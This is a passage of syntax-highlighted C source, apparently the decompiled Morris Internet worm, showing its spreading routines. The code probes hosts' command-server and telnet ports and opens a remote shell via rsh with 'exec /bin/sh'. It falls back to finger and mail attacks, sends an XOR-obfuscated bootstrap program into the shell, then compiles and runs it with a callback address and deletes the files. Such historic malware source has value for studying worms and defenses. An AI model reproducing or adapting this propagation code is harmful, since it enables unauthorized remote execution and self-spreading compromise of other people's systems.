        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* Only called in the function above */</span><span class="sc0">
</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc11">command_port_p</span><span class="sc10">(</span><span class="sc11">addr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">time</span><span class="sc10">)</span><span class="sc0">       </span><span class="sc1">/* x36d2, &lt;hi+634&gt; */</span><span class="sc0">
     </span><span class="sc11">u_long</span><span class="sc0"> </span><span class="sc11">addr</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">time</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">connection</span><span class="sc10">;</span><span class="sc0">                  </span><span class="sc1">/* 28 */</span><span class="sc0">
    </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr_in</span><span class="sc0"> </span><span class="sc11">sin</span><span class="sc10">;</span><span class="sc0">         </span><span class="sc1">/* 16 bytes */</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc10">(*</span><span class="sc11">save_sighand</span><span class="sc10">)();</span><span class="sc0">
    
    </span><span class="sc11">s</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">socket</span><span class="sc10">(</span><span class="sc11">AF_INET</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SOCK_STREAM</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">s</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">bzero</span><span class="sc10">(&amp;</span><span class="sc11">sin</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">sin</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">sin</span><span class="sc10">.</span><span class="sc11">sin_family</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">AF_INET</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">sin</span><span class="sc10">.</span><span class="sc11">sin_addr</span><span class="sc10">.</span><span class="sc11">s_addr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">addr</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">sin</span><span class="sc10">.</span><span class="sc11">sin_port</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">IPPORT_CMDSERVER</span><span class="sc10">;</span><span class="sc0">        </span><span class="sc1">/* Oh no, not the command serve
r... */</span><span class="sc0">
    
    </span><span class="sc11">save_sighand</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">signal</span><span class="sc10">(</span><span class="sc11">SIGALRM</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">justreturn</span><span class="sc10">);</span><span class="sc0">     </span><span class="sc1">/* Wakeup if it
 fails */</span><span class="sc0">
    
    </span><span class="sc1">/* Set up a timeout to break from connect if it fails */</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">time</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc11">time</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">alarm</span><span class="sc10">(</span><span class="sc11">time</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">connection</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">connect</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">sin</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">sin</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">alarm</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
    
    </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">);</span><span class="sc0">
    
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">connection</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">errno</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">ENETUNREACH</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc11">error</span><span class="sc10">(</span><span class="sc6">"Network unreachable"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">connection</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc11">try_telnet_p</span><span class="sc10">(</span><span class="sc11">addr</span><span class="sc10">)</span><span class="sc0">           </span><span class="sc1">/* x37b2 &lt;hi+858&gt;, checked */</span><span class="sc0">
     </span><span class="sc11">u_long</span><span class="sc0"> </span><span class="sc11">addr</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">connection</span><span class="sc10">;</span><span class="sc0">                  </span><span class="sc1">/* 28 */</span><span class="sc0">
    </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr_in</span><span class="sc0"> </span><span class="sc11">sin</span><span class="sc10">;</span><span class="sc0">         </span><span class="sc1">/* 16 bytes */</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc10">(*</span><span class="sc11">save_sighand</span><span class="sc10">)();</span><span class="sc0">
    
    </span><span class="sc11">s</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">socket</span><span class="sc10">(</span><span class="sc11">AF_INET</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SOCK_STREAM</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">s</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">bzero</span><span class="sc10">(&amp;</span><span class="sc11">sin</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">sin</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">sin</span><span class="sc10">.</span><span class="sc11">sin_family</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">AF_INET</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">sin</span><span class="sc10">.</span><span class="sc11">sin_addr</span><span class="sc10">.</span><span class="sc11">s_addr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">addr</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">sin</span><span class="sc10">.</span><span class="sc11">sin_port</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">IPPORT_TELNET</span><span class="sc10">;</span><span class="sc0">       </span><span class="sc1">/* This time try telnet... */</span><span class="sc0">
    
    </span><span class="sc1">/* Set up a 5 second timeout, break from connect if it fails */</span><span class="sc0">
    </span><span class="sc11">save_sighand</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">signal</span><span class="sc10">(</span><span class="sc11">SIGALRM</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">justreturn</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">alarm</span><span class="sc10">(</span><span class="sc4">5</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">connection</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">connect</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">sin</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">sin</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">connection</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0">  </span><span class="sc10">&amp;&amp;</span><span class="sc0">  </span><span class="sc11">errno</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">ECONNREFUSED</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc1">/* Telnet connection refuse
d */</span><span class="sc0">
    </span><span class="sc11">connection</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">alarm</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">                   </span><span class="sc1">/* Turn off timeout */</span><span class="sc0">
    
    </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">);</span><span class="sc0">
    
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">connection</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* Used in hg(), hi(), and hi_84(). */</span><span class="sc0">
</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc11">try_rsh_and_mail</span><span class="sc10">(</span><span class="sc11">host</span><span class="sc10">)</span><span class="sc0">               </span><span class="sc1">/* x3884, &lt;hi+1068&gt; */</span><span class="sc0">
     </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">hst</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">host</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">fd1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">fd2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">result</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">host</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">me</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">               </span><span class="sc1">/* 1476 */</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">host</span><span class="sc10">-&gt;</span><span class="sc11">flag</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0x02</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">host</span><span class="sc10">-&gt;</span><span class="sc11">flag</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0x04</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">host</span><span class="sc10">-&gt;</span><span class="sc11">o48</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">host</span><span class="sc10">-&gt;</span><span class="sc11">hostname</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc11">getaddrs</span><span class="sc10">(</span><span class="sc11">host</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">host</span><span class="sc10">-&gt;</span><span class="sc11">o48</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">host</span><span class="sc10">-&gt;</span><span class="sc11">flag</span><span class="sc0"> </span><span class="sc10">|=</span><span class="sc0"> </span><span class="sc4">0x04</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">other_sleep</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">host</span><span class="sc10">-&gt;</span><span class="sc11">hostname</span><span class="sc0">  </span><span class="sc10">&amp;&amp;</span><span class="sc0">      </span><span class="sc1">/* 1352 */</span><span class="sc0">
    </span><span class="sc11">fork_rsh</span><span class="sc10">(</span><span class="sc11">host</span><span class="sc10">-&gt;</span><span class="sc11">hostname</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">fd1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">fd2</span><span class="sc10">,</span><span class="sc0">
          </span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">"exec /bin/sh"</span><span class="sc10">)))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">        </span><span class="sc1">/* &lt;env+188&gt; */</span><span class="sc0">
    </span><span class="sc11">result</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">talk_to_sh</span><span class="sc10">(</span><span class="sc11">host</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">fd1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">fd2</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">fd1</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">fd2</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc1">/* Prevent child from hanging around in the &lt;exiting&gt; state */</span><span class="sc0">
    </span><span class="sc11">wait3</span><span class="sc10">((</span><span class="sc16">union</span><span class="sc0"> </span><span class="sc11">wait</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">WNOHANG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">rusage</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">result</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">result</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">try_finger</span><span class="sc10">(</span><span class="sc11">host</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">fd1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">fd2</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">     </span><span class="sc1">/* 1440 */</span><span class="sc0">
    </span><span class="sc11">result</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">talk_to_sh</span><span class="sc10">(</span><span class="sc11">host</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">fd1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">fd2</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">fd1</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">fd2</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">result</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">result</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">try_mail</span><span class="sc10">(</span><span class="sc11">host</span><span class="sc10">))</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc11">host</span><span class="sc10">-&gt;</span><span class="sc11">flag</span><span class="sc0"> </span><span class="sc10">|=</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc1">/* Check a2in() as it is updated */</span><span class="sc0">
</span><span class="sc1">/* Used in twice in try_rsh_and_mail(), once in hu1(). */</span><span class="sc0">
</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc11">talk_to_sh</span><span class="sc10">(</span><span class="sc11">host</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">fdrd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">fdwr</span><span class="sc10">)</span><span class="sc0">     </span><span class="sc1">/* x3a20, Checked, changed &lt;hi+
&gt;*/</span><span class="sc0">
     </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">hst</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">host</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">fdrd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">fdwr</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">object</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">objectptr</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">send_buf</span><span class="sc10">[</span><span class="sc4">512</span><span class="sc10">];</span><span class="sc0">             </span><span class="sc1">/* l516 */</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">print_buf</span><span class="sc10">[</span><span class="sc4">52</span><span class="sc10">];</span><span class="sc0">             </span><span class="sc1">/* l568 */</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">l572</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">l576</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">l580</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">l584</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">l588</span><span class="sc10">,</span><span class="sc0">  </span><span class="sc11">l592</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc11">objectptr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">getobjectbyname</span><span class="sc10">(</span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">"l1.c"</span><span class="sc10">));</span><span class="sc0">    </span><span class="sc1">/* env 200c9 */</span><span class="sc0">
    
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">objectptr</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">               </span><span class="sc1">/* &lt;hi+2128&gt; */</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">makemagic</span><span class="sc10">(</span><span class="sc11">host</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">l592</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">l580</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">l584</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">l588</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">send_text</span><span class="sc10">(</span><span class="sc11">fdwr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">"PATH=/bin:/usr/bin:/usr/ucb\n"</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">send_text</span><span class="sc10">(</span><span class="sc11">fdwr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">"cd /usr/tmp\n"</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">l576</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">random</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">0x00FFFFFF</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc11">sprintf</span><span class="sc10">(</span><span class="sc11">print_buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">"x%d.c"</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">l576</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc1">/* The 'sed' script just puts the EOF on the transmitted program. */</span><span class="sc0">
    </span><span class="sc11">sprintf</span><span class="sc10">(</span><span class="sc11">send_buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">"echo gorch49;sed \'/int zz;/q\' &gt; %s;echo gorch50\n"</span><span class="sc0">
</span><span class="sc10">),</span><span class="sc0">
        </span><span class="sc11">print_buf</span><span class="sc10">);</span><span class="sc0">
    
    </span><span class="sc11">send_text</span><span class="sc10">(</span><span class="sc11">fdwr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">send_buf</span><span class="sc10">);</span><span class="sc0">
    
    </span><span class="sc11">wait_for</span><span class="sc10">(</span><span class="sc11">fdrd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">"gorch49"</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc4">10</span><span class="sc10">);</span><span class="sc0">
    
    </span><span class="sc11">xorbuf</span><span class="sc10">(</span><span class="sc11">objectptr</span><span class="sc10">-&gt;</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">objectptr</span><span class="sc10">-&gt;</span><span class="sc11">size</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">l572</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">write</span><span class="sc10">(</span><span class="sc11">fdwr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">objectptr</span><span class="sc10">-&gt;</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">objectptr</span><span class="sc10">-&gt;</span><span class="sc11">size</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">xorbuf</span><span class="sc10">(</span><span class="sc11">objectptr</span><span class="sc10">-&gt;</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">objectptr</span><span class="sc10">-&gt;</span><span class="sc11">size</span><span class="sc10">);</span><span class="sc0">
    
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">l572</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">objectptr</span><span class="sc10">-&gt;</span><span class="sc11">size</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">l588</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">               </span><span class="sc1">/* to &lt;hi+2128&gt; */</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">send_text</span><span class="sc10">(</span><span class="sc11">fdwr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">"int zz;\n\n"</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">wait_for</span><span class="sc10">(</span><span class="sc11">fdrd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">"gorch50"</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc4">30</span><span class="sc10">);</span><span class="sc0">
    
</span><span class="sc9">#define COMPILE  "cc -o x%d x%d.c;./x%d %s %d %d;rm -f x%d x%d.c;echo DONE\n"
</span><span class="sc0">    </span><span class="sc11">sprintf</span><span class="sc10">(</span><span class="sc11">send_buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc11">COMPILE</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">l576</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">l576</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">l576</span><span class="sc10">,</span><span class="sc0">
        </span><span class="sc11">inet_ntoa</span><span class="sc10">(</span><span class="sc11">a2in</span><span class="sc10">(</span><span class="sc11">l592</span><span class="sc10">)),</span><span class="sc0"> </span><span class="sc11">l580</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">l584</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">l576</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">l576</span><span class="sc10">);</span><span class="sc0">
    
    
    </span><span class="sc11">send_text</span><span class="sc10">(</span><span class="sc11">fdwr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">send_buf</span><span class="sc10">);</span><span class="sc0">
    
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">wait_for</span><span class="sc10">(</span><span class="sc11">fdrd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">"DONE"</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc4">100</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">l588</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">               </span><span class="sc1">/* &lt;hi+2128&gt; */</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">waithit</span><span class="sc10">(</span><span class="sc11">host</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">l592</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">l580</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">l584</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">l588</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">makemagic</span><span class="sc10">(</span><span class="sc11">arg8</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">arg12</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">arg16</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">arg20</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">arg24</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc1">/* checked */</span><span class="sc0">
